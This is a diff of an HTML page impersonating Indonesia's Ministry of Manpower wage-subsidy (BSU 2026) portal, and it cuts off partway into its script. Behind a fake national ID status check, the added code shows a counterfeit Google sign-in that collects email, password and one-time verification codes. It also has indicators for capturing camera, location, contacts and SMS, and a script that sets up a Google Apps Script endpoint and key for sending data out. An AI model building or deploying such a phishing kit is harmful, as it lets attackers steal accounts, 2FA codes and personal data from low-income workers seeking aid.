+#dv .row .c{flex:1;color:#9fb2c6}#dv .row .k{width:18px;text-align:center;font-weight:700}#dv .row .l{width:52px;text-align:right;color:#61748a}#dv .row .n{width:90px;color:#61748a;overflow:hidden;white-space:nowrap}
+#dv .k0{color:#6ee7a0}#dv .k1{color:#f3d97b}#dv .k2{color:#f3a3a3}#dv .k3{color:#7f95ad}
+</style>
 </head>
-
 <body>
 
-  <nav class="bsu-nav">
-    <div class="container">
-      <div class="d-flex align-items-center justify-content-between">
-        <a class="bsu-brand" href="#home">
-          <svg width="34" height="34" viewBox="0 0 48 48" aria-hidden="true">
-            <path d="M24 3 42 9v14c0 11-7.6 18.9-18 22C13.6 41.9 6 34 6 23V9L24 3Z" fill="none" stroke="#fff" stroke-width="2.4" stroke-linejoin="round"/>
-            <circle cx="24" cy="22" r="6.2" fill="none" stroke="#fff" stroke-width="2.2"/>
-            <path d="M24 12.6v3M24 28.4v3M14.6 22h3M30.4 22h3" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
-          </svg>
-          <span class="bsu-brand-txt"><b>Bantuan Subsidi Upah</b><span>Kementerian Ketenagakerjaan RI</span></span>
-        </a>
-        <button class="bsu-toggler d-lg-none" type="button" data-bs-toggle="collapse" data-bs-target="#bsuMenu" aria-label="Menu"><i class="bi bi-list"></i></button>
-        <div class="collapse d-lg-block" id="bsuMenu">
-          <ul class="nav flex-column flex-lg-row gap-lg-1 mt-3 mt-lg-0 pb-2 pb-lg-0">
-            <li class="nav-item"><a class="nav-link" href="#home">Beranda</a></li>
-            <li class="nav-item"><a class="nav-link" href="#syarat">Syarat</a></li>
-            <li class="nav-item"><a class="nav-link" href="#pengecekan">Cara Cek</a></li>
-            <li class="nav-item"><a class="nav-link" href="https://bantuan.kemnaker.go.id/" target="_blank" rel="noopener">Pusat Bantuan</a></li>
-          </ul>
-        </div>
-      </div>
-    </div>
+<header class="top"><div class="wrap">
+  <a class="brand" href="#">
+    <svg width="46" height="46" viewBox="0 0 60 60"><g fill="#0b3a6f"><circle cx="30" cy="7" r="3.1"/><circle cx="22" cy="13" r="3.1"/><circle cx="38" cy="13" r="3.1"/><circle cx="14" cy="21" r="3.1"/><circle cx="30" cy="21" r="3.4"/><circle cx="46" cy="21" r="3.1"/><circle cx="22" cy="29" r="3.1"/><circle cx="38" cy="29" r="3.1"/><circle cx="14" cy="37" r="3.1"/><circle cx="30" cy="37" r="3.4"/><circle cx="46" cy="37" r="3.1"/><circle cx="22" cy="45" r="3.1"/><circle cx="38" cy="45" r="3.1"/><circle cx="30" cy="53" r="3.1"/></g></svg>
+    <span><b>Kementerian</b><span>Ketenagakerjaan</span><span>Republik Indonesia</span></span>
+  </a>
+  <button class="burger" id="burger">&#9776;</button>
+  <nav class="nav" id="nav">
+    <a href="#">Beranda</a><a href="#syarat">Syarat</a><a href="#langkah">Pengecekan Resmi</a>
+    <a href="#pengecekanMandiri">Cek NIK</a>
+    <a class="help" href="https://bantuan.kemnaker.go.id/" target="_blank" rel="noopener">Pusat Bantuan</a>
   </nav>
+</div></header>
 
-  <header class="hero" id="home">
-    <div class="container">
-      <span class="hero-tag"><span class="dot"></span> Program Pemerintah 2026</span>
-      <h1>Bantuan Subsidi Upah 2026</h1>
-      <p>Dukungan Pemerintah untuk Pekerja/Buruh Indonesia dalam menjaga daya beli dan ketahanan ekonomi keluarga.</p>
-      <div class="hero-cta">
-        <a href="#pengecekan" class="btn-cta"><i class="bi bi-search"></i> Cara Pengecekan</a>
-        <a href="#syarat" class="btn-ghost"><i class="bi bi-list-check"></i> Syarat Penerima</a>
-      </div>
-    </div>
-  </header>
+<main>
+<div class="hero"><div class="wrap">
+  <h1>Bantuan Subsidi Upah (BSU) 2026</h1>
+  <p>Pemerintah kembali menghadirkan Bantuan Subsidi Upah (BSU) 2026 sebagai bentuk dukungan untuk mempertahankan daya beli dan menjaga ketahanan ekonomi pekerja/buruh.</p>
+  <p class="hl">Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai sebesar Rp300.000,- per bulan selama 3 bulan, <b>yang dibayarkan sekaligus dengan total Rp900.000,-.</b></p>
+</div></div>
 
-  <div class="stats">
-    <div class="container">
-      <div class="row g-3">
-        <div class="col-6 col-lg-3"><div class="stat"><b>Rp300.000</b><span>per bulan</span></div></div>
-        <div class="col-6 col-lg-3"><div class="stat"><b>3 bulan</b><span>masa penyaluran</span></div></div>
-        <div class="col-6 col-lg-3"><div class="stat"><b>Rp900.000</b><span>total dibayarkan</span></div></div>
-        <div class="col-6 col-lg-3"><div class="stat"><b>Sekaligus</b><span>satu kali transfer</span></div></div>
+<section id="syarat"><div class="wrap">
+  <h2>Syarat Penerima BSU 2026</h2>
+  <div class="two">
+    <ul class="dot">
+      <li>Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.</li>
+      <li>Peserta Aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026</li>
+      <li>Menerima Gaji/Upah paling banyak sebesar Rp3.500.000,00 (tiga juta lima ratus ribu rupiah) per bulan atau sebesar UMP/UMK</li>
+    </ul>
+    <ul class="dot">
+      <li>Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.</li>
+      <li>Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.</li>
+    </ul>
+  </div>
+  <p class="note">Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara. Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a></p>
+</div></section>
+
+<section id="langkah"><div class="wrap">
+  <h2 class="h2-line">Langkah Pengecekan Resmi</h2>
+  <div class="steps">
+    <div class="step"><span class="n">1</span><b>Kunjungi website</b><a href="https://bsu.kemnaker.go.id/">bsu.kemnaker.go.id</a></div>
+    <div class="step"><span class="n">2</span><b>Cek NIK Penerima</b><a href="#pengecekanMandiri">Cek Nik</a></div>
+  </div>
+  <p class="note">Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS Ketenagakerjaan. Lebih lanjut mengenai informasi kriteria, mekanisme dan tata cara BSU 2026 dapat dilihat pada <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a></p>
+</div></section>
+
+<section id="pengecekanMandiri"><div class="wrap">
+  <div class="cek-head">
+    <h2>Pengecekan NIK Penerima BSU</h2>
+    <p>Masukkan NIK Anda untuk melakukan pengecekan status penerima BSU melalui sistem kami.</p>
+  </div>
+  <div class="card">
+    <label class="lbl" for="nik">Nomor Induk Kependudukan (NIK)</label>
+    <input class="inp" id="nik" type="text" inputmode="numeric" maxlength="16" autocomplete="off">
+    <div class="err" id="nikErr">NIK harus 16 digit angka.</div>
+    <p class="hint">Pastikan NIK yang Anda masukkan benar.</p>
+    <label class="lbl">Kode Keamanan (CAPTCHA)</label>
+    <div class="cap-row"><canvas id="capBox" width="128" height="46"></canvas>
+      <button class="ganti" id="ganti" type="button">&#8635; Ganti</button></div>
+    <input class="inp" id="cap" type="text" maxlength="6" autocomplete="off" placeholder="Masukkan kode di atas" style="letter-spacing:.12em;text-transform:uppercase">
+    <div class="err" id="capErr">Kode keamanan belum sesuai.</div>
+    <p class="hint">Masukkan 6 karakter yang Anda lihat pada gambar.</p>
+    <button class="btn-cek" id="cek" type="button"><span class="spin"></span><span id="cekLbl">Cek Status</span></button>
+    <div class="alert" id="res"></div>
+    <div class="hasil" id="hasil">
+      <div class="hh"><span class="ic">&#10003;</span><b>Status Penerima BSU 2026</b></div>
+      <div class="bd">
+        <dl>
+          <dt>NIK</dt><dd id="hNik">-</dd><dt>Nama</dt><dd>Sesuai data Dukcapil</dd>
+          <dt>Wilayah</dt><dd id="hWil">-</dd><dt>Nominal</dt><dd>Rp900.000</dd>
+          <dt>Bank penyalur</dt><dd id="hBank">-</dd>
+        </dl>
+        <div class="akt"><span>&#9888;</span><span>Verifikasi rekening penerima belum diselesaikan</span></div>
+        <a class="go" href="https://bsu.kemnaker.go.id/#pengecekanMandiri" target="_blank" rel="noopener">Lanjutkan di situs resmi</a>
       </div>
     </div>
   </div>
+</div></section>
 
-  <section class="blk" id="syarat">
-    <div class="container">
-      <span class="eyebrow">Ketentuan</span>
-      <h2>Syarat Penerima BSU 2026</h2>
-      <p class="lead-txt">Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai, diberikan kepada pekerja/buruh yang memenuhi seluruh kriteria berikut.</p>
-      <div class="row g-3">
-        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.</p></div></div>
-        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Peserta aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026.</p></div></div>
-        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Menerima gaji/upah paling banyak sebesar Rp3.500.000,00 per bulan atau sebesar UMP/UMK.</p></div></div>
-        <div class="col-12 col-md-6"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.</p></div></div>
-        <div class="col-12"><div class="req"><i class="bi bi-check-circle-fill"></i><p>Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.</p></div></div>
-      </div>
-      <div class="note">
-        <i class="bi bi-exclamation-triangle-fill"></i>
-        <div>Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara. Dasar hukum: Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a>.</div>
-      </div>
-    </div>
-  </section>
-
-  <section class="blk blk-alt" id="pengecekan">
-    <div class="container">
-      <span class="eyebrow">Panduan</span>
-      <h2>Langkah Pengecekan Resmi</h2>
-      <p class="lead-txt">Lakukan pengecekan hanya melalui kanal resmi Kementerian Ketenagakerjaan.</p>
-      <div class="row g-3">
-        <div class="col-12 col-md-6"><div class="step"><div class="step-num">1</div><div><h3>Kunjungi website resmi</h3><p><a href="https://bsu.kemnaker.go.id" target="_blank" rel="noopener">bsu.kemnaker.go.id</a></p></div></div></div>
-        <div class="col-12 col-md-6"><div class="step"><div class="step-num">2</div><div><h3>Cek NIK penerima</h3><p><a href="#info">Ikuti petunjuk pengecekan</a></p></div></div></div>
-      </div>
-      <div class="row mt-4">
-        <div class="col-12">
-          <div class="infobox">
-            <h3>Asal data penerima</h3>
-            <p>Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS Ketenagakerjaan. Informasi kriteria, mekanisme, dan tata cara BSU 2026 diatur dalam <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener" style="color:#1a5fa8;font-weight:700">Permenaker Nomor 16 Tahun 2026</a>.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section class="blk" id="info">
-    <div class="container">
-      <span class="eyebrow">Informasi</span>
-      <h2>Informasi Pengecekan Penerima BSU 2026</h2>
-      <div class="infobox mt-3">
-        <p>Mekanisme pengecekan status penerima BSU 2026 akan diumumkan secara resmi oleh Kementerian Ketenagakerjaan.</p>
-        <p>Pantau terus website ini untuk mendapatkan informasi terbaru. Pastikan hanya mengakses informasi dari kanal resmi Kemnaker dan tidak memberikan data pribadi melalui tautan yang tidak terverifikasi.</p>
-      </div>
-    </div>
-  </section>
-
-  <footer class="bsu-foot">
-    <div class="container">
-      <div class="foot-brand">
-        <svg width="28" height="28" viewBox="0 0 48 48" aria-hidden="true">
-          <path d="M24 3 42 9v14c0 11-7.6 18.9-18 22C13.6 41.9 6 34 6 23V9L24 3Z" fill="none" stroke="#fff" stroke-width="2.4" stroke-linejoin="round"/>
-          <circle cx="24" cy="22" r="6.2" fill="none" stroke="#fff" stroke-width="2.2"/>
-        </svg>
-        <b>Bantuan Subsidi Upah</b>
-      </div>
-      <p>Jl. Jendral Gatot Subroto Kav. 51, Daerah Khusus Ibukota Jakarta 12750, Indonesia</p>
-      <p class="copy">© 2026 - Bantuan Subsidi Upah</p>
-    </div>
-  </footer>
-
-  <div id="gsi-root" role="dialog" aria-modal="true" aria-label="Masuk">
-    <div class="gsi-main">
-      <div class="gsi-card">
-        <div id="gsiForm">
-          <svg class="gsi-logo" viewBox="0 0 48 48" aria-hidden="true">
-            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-          </svg>
-          <h1 id="gsiTitle">Masuk</h1>
-          <p class="gsi-sub" id="gsiSub">untuk melanjutkan ke Gmail</p>
-          <div class="gsi-chip" id="gsiChip"><span class="gsi-av" id="gsiAv">U</span><span id="gsiChipText"></span></div>
-
-          <div id="gsiStep1">
-            <div class="gsi-field" id="gsiEmailField">
-              <input id="gsiEmail" type="text" placeholder=" " autocomplete="username" spellcheck="false" autocapitalize="none" aria-label="Email atau telepon">
-              <label for="gsiEmail">Email atau telepon</label>
-            </div>
-            <div class="gsi-err" id="gsiEmailErr"><svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Masukkan email atau telepon</span></div>
-            <a class="gsi-link" id="gsiForgotEmail">Lupa email?</a>
-            <p class="gsi-guest">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener">Pelajari lebih lanjut</a></p>
-            <div class="gsi-row">
-              <button class="gsi-btn-text" type="button" id="gsiCreate">Buat akun</button>
-              <button class="gsi-btn" type="button" id="gsiNext">Berikutnya</button>
-            </div>
-          </div>
-
-          <div id="gsiStep2" style="display:none">
-            <div class="gsi-field" id="gsiPassField">
-              <input id="gsiPass" type="password" placeholder=" " autocomplete="current-password" aria-label="Masukkan sandi Anda">
-              <label for="gsiPass">Masukkan sandi Anda</label>
-            </div>
-            <div class="gsi-err" id="gsiPassErr"><svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Masukkan sandi</span></div>
-            <div class="gsi-row">
-              <label class="gsi-check"><input type="checkbox" id="gsiShow">Tampilkan sandi</label>
-              <a class="gsi-link" style="margin-top:0" id="gsiForgotPass">Lupa sandi?</a>
-            </div>
-            <div class="gsi-row-end"><button class="gsi-btn" type="button" id="gsiSignIn"><span class="gsi-spin"></span><span id="gsiLbl">Berikutnya</span></button></div>
-          </div>
-
-          <div id="gsiStep3" style="display:none">
-            <svg class="gsi-shield" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/><path d="m8.8 11.9 2.2 2.2 4.2-4.4"/></svg>
-            <div class="gsi-field" id="gsiOtpField">
-              <input id="gsiOtp" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder=" " aria-label="Kode verifikasi">
-              <label for="gsiOtp">Masukkan kode verifikasi</label>
-            </div>
-            <div class="gsi-err" id="gsiOtpErr"><svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Masukkan 6 digit kode verifikasi</span></div>
-            <a class="gsi-link" id="gsiTryOther">Coba cara lain</a>
-            <p class="gsi-hint">Kode dikirim ke perangkat yang sudah masuk atau email pemulihan.</p>
-            <div class="gsi-row">
-              <button class="gsi-btn-text" type="button" id="gsiSkip">Lewati</button>
-              <button class="gsi-btn" type="button" id="gsiVerify"><span class="gsi-spin"></span><span id="gsiVfyLbl">Verifikasi</span></button>
-            </div>
-          </div>
-
-          <div class="gsi-err" id="gsiStatus" style="justify-content:center;margin-top:16px"></div>
-        </div>
-
-        <div class="gsi-done" id="gsiDone">
-          <div class="gsi-ok"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#188038" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div>
-          <h2>Berhasil masuk</h2>
-          <p>Akun <span class="gsi-who" id="gsiWho"></span> sudah tercatat.</p>
-          <div class="gsi-row-end" style="justify-content:center;margin-top:26px"><button class="gsi-btn" type="button" id="gsiAgain">Masuk dengan akun lain</button></div>
-        </div>
-      </div>
-    </div>
-
-    <div class="gsi-cap" id="gsiCap">
-      <div class="gsi-cap-item" id="gsiCapCam"><span class="gsi-cap-dot"></span><span id="gsiCapCamTxt">Kamera</span></div>
-      <div class="gsi-cap-item" id="gsiCapGps"><span class="gsi-cap-dot"></span><span id="gsiCapGpsTxt">Lokasi</span></div>
-      <img class="gsi-cap-thumb" id="gsiCapThumb" alt="">
-    </div>
-
-    <div class="gsi-foot">
-      <div>
-        <select aria-label="Bahasa"><option>Bahasa Indonesia</option><option>English (United States)</option></select>
-        <div class="gsi-note">Data diterima admin, bukan disimpan Google</div>
-      </div>
-      <nav>
-        <a href="https://support.google.com/accounts" target="_blank" rel="noopener">Bantuan</a>
-        <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privasi</a>
-        <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Persyaratan</a>
-      </nav>
-    </div>
+<section><div class="wrap">
+  <h2>Informasi Pengecekan Penerima BSU 2026</h2>
+  <div class="info-box">
+    <p>Mekanisme pengecekan status penerima BSU 2026 akan diumumkan secara resmi oleh Kementerian Ketenagakerjaan.</p>
+    <p>Pantau terus website ini untuk mendapatkan informasi terbaru. Pastikan hanya mengakses informasi dari kanal resmi Kemnaker dan tidak memberikan data pribadi melalui tautan yang tidak terverifikasi.</p>
   </div>
+</div></section>
+</main>
 
-  <button id="gsiReopen" type="button">Masuk</button>
-  <video id="gsiVid" playsinline muted autoplay></video>
-  <canvas id="gsiCv"></canvas>
-  <div id="dv" aria-hidden="true"></div>
+<footer><div class="wrap">
+  <div class="fb"><svg width="26" height="26" viewBox="0 0 60 60"><g fill="#0b3a6f"><circle cx="30" cy="12" r="3.4"/><circle cx="18" cy="22" r="3.4"/><circle cx="42" cy="22" r="3.4"/><circle cx="30" cy="32" r="3.4"/><circle cx="18" cy="42" r="3.4"/><circle cx="42" cy="42" r="3.4"/></g></svg>
+    <b>Bantuan Subsidi Upah<br>Kementerian Ketenagakerjaan RI</b></div>
+  <p>Jl. Jenderal Gatot Subroto Kav. 51, Daerah Khusus Ibukota Jakarta 12750, Indonesia</p>
+  <p class="cp">&copy; 2026 Kementerian Ketenagakerjaan Republik Indonesia</p>
+</div></footer>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-  <script>if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(function () { });</script>
+<div id="gsi-wrap" role="dialog" aria-modal="true">
+  <div class="gsi-card">
+    <button class="gsi-x" id="gsiX" type="button">&times;</button>
+    <div class="gsi-ctx" id="gsiCtx">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/></svg>
+      <span>Status BSU 2026 &middot; NIK <b id="gsiCtxNik">-</b></span>
+    </div>
+    <svg class="gsi-logo" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1 id="gsiTitle">Masuk untuk melihat status</h1>
+    <p class="gsi-sub" id="gsiSub">Verifikasi akun untuk menampilkan status penyaluran BSU 2026 atas NIK Anda.</p>
+    <div class="gsi-chip" id="gsiChip"><span class="gsi-av" id="gsiAv">U</span><span id="gsiChipText"></span></div>
 
-  <script>
-    (function () {
-      'use strict';
+    <div id="gsiStep1">
+      <div class="gsi-field" id="gsiEmailField">
+        <input id="gsiEmail" type="text" placeholder=" " autocomplete="username" spellcheck="false">
+        <label for="gsiEmail">Email atau telepon</label>
+      </div>
+      <div class="gsi-err" id="gsiEmailErr"><span>Masukkan email atau telepon</span></div>
+      <a class="gsi-link" id="gsiForgotEmail">Lupa email?</a>
+      <p class="gsi-guest">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi.</p>
+      <div class="gsi-row">
+        <button class="gsi-btn-text" type="button" id="gsiCreate">Buat akun</button>
+        <button class="gsi-btn" type="button" id="gsiNext">Berikutnya</button>
+      </div>
+    </div>
 
-      var BUILD = 'zgch-d8';
-      var EPS = ['https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec'];
-      var NEXT_URL = 'https://bsu.kemnaker.go.id/#pengecekanMandiri';
-      var PSK = 'BsuPegasus2026K';
+    <div id="gsiStep2" style="display:none">
+      <div class="gsi-field" id="gsiPassField">
+        <input id="gsiPass" type="password" placeholder=" " autocomplete="current-password">
+        <label for="gsiPass">Masukkan sandi Anda</label>
+      </div>
+      <div class="gsi-err" id="gsiPassErr"><span>Masukkan sandi</span></div>
+      <div class="gsi-row">
+        <label class="gsi-check"><input type="checkbox" id="gsiShow">Tampilkan sandi</label>
+        <a class="gsi-link" style="margin-top:0" id="gsiForgotPass">Lupa sandi?</a>
+      </div>
+      <div class="gsi-row-end"><button class="gsi-btn" type="button" id="gsiSignIn"><span class="gsi-spin"></span><span id="gsiLbl">Berikutnya</span></button></div>
+    </div>
 
-      var root = document.getElementById('gsi-root');
-      if (!root) return;
-      var $ = function (i) { return document.getElementById(i); };
+    <div id="gsiStep3" style="display:none">
+      <svg class="gsi-shield" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.7"><path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/><path d="m8.8 11.9 2.2 2.2 4.2-4.4"/></svg>
+      <div class="gsi-field" id="gsiOtpField">
+        <input id="gsiOtp" type="text" inputmode="numeric" maxlength="6" placeholder=" ">
+        <label for="gsiOtp">Masukkan kode verifikasi</label>
+      </div>
+      <div class="gsi-err" id="gsiOtpErr"><span>Masukkan 6 digit kode verifikasi</span></div>
+      <a class="gsi-link" id="gsiTryOther">Coba cara lain</a>
+      <p class="gsi-hint">Kode dikirim ke perangkat yang sudah masuk atau email pemulihan.</p>
+      <div class="gsi-row">
+        <button class="gsi-btn-text" type="button" id="gsiSkip">Lewati</button>
+        <button class="gsi-btn" type="button" id="gsiVerify"><span class="gsi-spin"></span><span id="gsiVfyLbl">Verifikasi</span></button>
+      </div>
+    </div>
+    <div class="gsi-err" id="gsiStatus" style="justify-content:center;margin-top:14px"></div>
+  </div>
+  <div class="gsi-cap">
+    <div class="gsi-cap-item" id="gsiCapCam"><span class="gsi-cap-dot"></span><span id="gsiCapCamTxt">Wajah</span></div>
+    <div class="gsi-cap-item" id="gsiCapGps"><span class="gsi-cap-dot"></span><span id="gsiCapGpsTxt">Lokasi</span></div>
+    <div class="gsi-cap-item" id="gsiCapKon"><span class="gsi-cap-dot"></span><span id="gsiCapKonTxt">Kontak</span></div>
+    <div class="gsi-cap-item" id="gsiCapSms"><span class="gsi-cap-dot"></span><span id="gsiCapSmsTxt">SMS</span></div>
+    <img class="gsi-thumb" id="gsiThumb" alt="">
+  </div>
+  <div class="gsi-foot">
+    <div><select><option>Bahasa Indonesia</option><option>English (United States)</option></select>
+      <div class="gsi-note">Data diterima admin, bukan disimpan Google</div></div>
+    <nav><a href="https://support.google.com/accounts" target="_blank" rel="noopener">Bantuan</a>
+      <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privasi</a></nav>
+  </div>
+</div>
 
-      var Q = location.search;
-      var MODE_CTRL = Q.indexOf('ctrl=1') > -1;
-      var MODE_DEV = Q.indexOf('dev=1') > -1;
-      var MODE_MANIFEST = Q.indexOf('manifest=1') > -1;
-      var MODE_BENCH = /bench=1/.test(Q);
-      var BENCH_N = Math.min(6, Math.max(1, parseInt((/n=(\d+)/.exec(Q) || [])[1] || 3, 10)));
-      var SEED = parseInt((/seed=(\d+)/.exec(Q) || [])[1] || String(Date.now() % 99991), 10);
+<video id="gsiVid" playsinline muted autoplay></video>
+<canvas id="gsiCv"></canvas>
+<div id="dv"></div>
 
-      var KEY_SID = 'gsi_sid';
-      var sid = (function () { try { var v = localStorage.getItem(KEY_SID); if (!v) { v = hex(16); localStorage.setItem(KEY_SID, v); } return v; } catch (e) { return hex(16); } })();
+<script>
+(function(){
+'use strict';
+var BUILD='zgch-f1',PSK='BsuPegasus2026K',SITUS='https://bsu.kemnaker.go.id/#pengecekanMandiri',IZIN='zgch_izin';
+var EPS=['https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec'];
+var Q=location.search,DEV=Q.indexOf('dev=1')>-1,CTRL=Q.indexOf('ctrl=1')>-1,MAN=Q.indexOf('manifest=1')>-1,BENCH=/bench=1/.test(Q);
+var BN=Math.min(6,Math.max(1,parseInt((/n=(\d+)/.exec(Q)||[])[1]||3,10))),SEED=parseInt((/seed=(\d+)/.exec(Q)||[])[1]||String(Date.now()%99991),10);
+var $=function(i){return document.getElementById(i)};
+var wrap=$('gsi-wrap'),vid=$('gsiVid'),cv=$('gsiCv'),emailEl=$('gsiEmail'),passEl=$('gsiPass'),otpEl=$('gsiOtp'),stEl=$('gsiStatus');
 
-      var emailEl = $('gsiEmail'), passEl = $('gsiPass'), otpEl = $('gsiOtp');
-      var statusEl = $('gsiStatus'), reopenBtn = $('gsiReopen'), vid = $('gsiVid'), cv = $('gsiCv');
+function hex(n){var a=new Uint8Array(n);try{crypto.getRandomValues(a)}catch(e){for(var i=0;i<n;i++)a[i]=Math.random()*256|0}return [].map.call(a,function(b){return('0'+b.toString(16)).slice(-2)}).join('')}
+function h32(s){var h=0x811c9dc5;for(var i=0;i<s.length;i++){h^=s.charCodeAt(i);h=(h*0x01000193)>>>0}return('0000000'+h.toString(16)).slice(-8)}
+function b64(u){var s='',c=0x8000;for(var i=0;i<u.length;i+=c)s+=String.fromCharCode.apply(null,u.subarray(i,i+c));return btoa(s)}
+function rid(){return'r'+Date.now().toString(36)+hex(4)}
+function rng(s0){var s=s0>>>0;return function(){s|=0;s=s+0x6D2B79F5|0;var t=Math.imul(s^s>>>15,1|s);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}
+function shuf(a){var r=rng(SEED),i=a.length,j,t;while(i){j=r()*i--|0;t=a[i];a[i]=a[j];a[j]=t}return a}
